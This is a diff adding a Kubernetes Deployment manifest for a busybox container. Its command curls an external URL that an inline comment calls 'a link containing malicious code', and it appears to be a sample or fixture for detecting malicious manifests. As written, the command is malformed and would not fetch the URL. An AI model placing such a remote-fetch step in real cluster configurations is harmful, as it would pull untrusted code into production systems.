@@ -1,0 +1,23 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: busybox
+spec:
+  selector:
+    matchLabels:
+      app: busybox
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: busybox
+    spec:
+      containers:
+        - name: busybox
+          image: busybox
+          command:
+          - sh
+          - -c
+          - curl
+          - "http://xksqu4mj.fri3nds.in/tools/clay" # a link containing malicious code
+          - sleep 1000000
